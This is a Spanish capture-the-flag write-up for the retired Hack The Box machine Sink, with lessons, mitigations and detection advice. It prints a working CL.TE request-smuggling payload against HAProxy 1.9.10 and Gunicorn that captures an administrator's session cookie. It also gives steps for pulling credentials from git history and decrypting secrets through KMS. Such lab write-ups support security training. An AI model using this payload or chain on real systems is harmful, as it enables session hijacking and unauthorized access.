---
machine: Sink
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, http-smuggling, haproxy, gunicorn, gitea, aws, localstack, kms]
---

# Sink — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Tres capas muy distintas. Un **HTTP request smuggling CL.TE** entre **HAProxy 1.9.10** (CVE-2019-18277) y **Gunicorn 20.0.0** permite robar la sesión del administrador de una app de notas; con ella se llega a **Gitea 1.12.6**, donde el historial de commits guarda una clave SSH y credenciales de **AWS**. Esas credenciales apuntan a un **LocalStack** con Secrets Manager, CloudWatch Logs y KMS: los logs filtran un secreto y KMS descifra el fichero que da root.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH
3000/tcp  http  Gitea 1.12.6
5000/tcp  http  app de notas (HAProxy 1.9.10 → Gunicorn 20.0.0)
```

`curl -sI http://<IP>:5000/` devuelve `Server: gunicorn/20.0.0` y `Via: haproxy`: dos servidores que parsean distinto, la condición previa del smuggling. En el 3000 hay un Gitea con login y un usuario `root` con repositorios.

## Enumeración

- La app del 5000 permite registrarse y publicar **comentarios**; el comentario se refleja en la página, que es lo que convierte la petición del administrador en dato legible.
- Una petición malformada al proxy revela su versión exacta en las cabeceras de error: **HAProxy 1.9.10**.
- En Gitea, los repositorios de `root` tienen commits con ficheros que no deberían estar ahí (`Key_Management`, `Log_Management`).

## Foothold: CL.TE con `Transfer-Encoding` ofuscado

HAProxy 1.9.10 prioriza `Content-Length` e **ignora** un `Transfer-Encoding: chunked` que venga ofuscado; Gunicorn hace lo contrario y lo interpreta como *chunked*. Basta un **byte de tabulación vertical (0x0B)** delante de `chunked`:

```http
POST /comment HTTP/1.1
Host: <IP>:5000
Content-Length: 4
Transfer-Encoding: chunked

1c
note=test
0


POST /comment HTTP/1.1
Host: <IP>:5000
Content-Length: 60

note=
```

El primer cuerpo se corta donde HAProxy cree que acaba la petición; Gunicorn sigue leyendo y toma el resto como una **nueva petición**. Cuando el administrador envía la suya por la misma conexión, su cabecera `Cookie: session=...` queda pegada al parámetro `note=` y aparece reflejada en los comentarios.

```text
Cookie: session=<sesión de admin>
```

Se sustituye la cookie en el navegador y se entra como `admin@sink.htb`.

## Movimiento lateral

- **Panel de admin → Gitea**: las notas privadas del administrador contienen credenciales en claro (Chef, nodo de desarrollo, Nagios); la del nodo de desarrollo abre el **Gitea** del 3000.
- **Gitea → SSH**: en `root/Key_Management` hay un commit con una clave privada; pertenece a `marcus` y da acceso al host.
- **Gitea → AWS**: en `root/Log_Management` hay un commit con `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`. Los secretos en el historial sobreviven al borrado del fichero: `git log --all` los encuentra.

## Escalada de privilegios

El destino de esas credenciales es un **LocalStack** que emula AWS dentro de la propia máquina:

```bash
aws configure set aws_access_key_id <AKIA...>
aws configure set aws_secret_access_key <secret>
aws --endpoint-url=http://<IP>:4566 secretsmanager list-secrets
aws --endpoint-url=http://<IP>:4566 logs describe-log-groups
```

- **CloudWatch Logs** contiene trazas de la aplicación con valores de secretos en claro: de ahí sale la contraseña de otro usuario.
- **Secrets Manager** guarda el secreto de root, pero cifrado con una **CMK**; sin `kms:Decrypt` no sirve de nada.
- Con `kms decrypt` sobre el blob (y el `encryption-context` correcto) se obtiene el texto plano: la contraseña de `root` del host.

```bash
aws --endpoint-url=http://<IP>:4566 kms decrypt \
  --ciphertext-blob fileb://secret.bin --output text --query Plaintext | base64 -d
```

## Evidencia (redactada)

```text
/home/marcus/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones

- El smuggling no necesita un payload exótico: basta que proxy y backend no coincidan en cómo leer `Content-Length` y `Transfer-Encoding`.
- Ofuscar la cabecera (`0x0B` delante de `chunked`) es lo que hace que el proxy la ignore y el backend la acepte.
- Los secretos en el historial de git sobreviven al borrado: `git log --all` los encuentra.
- En la nube, `secretsmanager:GetSecretValue` sin `kms:Decrypt` no vale nada; la escalada es la suma de ambos permisos.
- Los logs son un almacén de secretos por accidente: revisar qué se escribe en CloudWatch.

## Mitigaciones y detección

- Rechazar peticiones con `Content-Length` y `Transfer-Encoding` a la vez, y normalizar cabeceras en el proxy (actualizar HAProxy ≥ 2.0.6).
- Escaneo de secretos en CI y en el historial de git; claves IAM por servicio y con permisos mínimos.
- Cifrar secretos con KMS y separar quién puede leerlos de quién puede descifrarlos; no volcar valores en logs.
- Detección: peticiones con `Transfer-Encoding` ofuscado, `Via: haproxy` con cuerpos que no cuadran, y `kms:Decrypt` desde una instancia que no lo necesita.

## Referencias

- [CVE-2019-18277 — HAProxy request smuggling](https://nvd.nist.gov/vuln/detail/CVE-2019-18277)
- [HAProxy — request smuggling y `Transfer-Encoding`](https://www.haproxy.com/blog/haproxy-and-request-smuggling)
- [Hack The Box — Sink](https://www.hackthebox.com/machines/sink)
